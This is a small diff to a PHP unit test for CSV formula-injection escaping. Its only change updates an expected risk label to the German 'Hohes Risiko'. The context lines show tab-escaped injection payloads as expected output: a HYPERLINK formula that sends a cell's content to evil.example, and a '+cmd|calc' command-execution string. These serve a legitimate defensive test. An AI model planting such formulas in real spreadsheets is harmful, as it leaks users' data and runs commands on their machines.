@@ -72,8 +72,9 @@ class CsvFormulaInjectionTest extends TestCase {
         self::assertSame("\t=HYPERLINK(\"https://evil.example/?\"&A2,\"klick\")", $cells[0]);
         self::assertSame("\t+cmd|calc; low accuracy", $cells[3]);
         self::assertSame("\t@SUM(1)", $cells[5]);
-        // harmless cells stay as they were, numbers are not touched
-        self::assertSame('high', $cells[1]);
+        // harmless cells stay as they were, numbers are not touched (GitHub #48: the risk
+        // level is a label in the exporter's language; without IL10N the German source)
+        self::assertSame('Hohes Risiko', $cells[1]);
         self::assertSame('3', $cells[2]);
         self::assertSame('12', $cells[4]);
     }
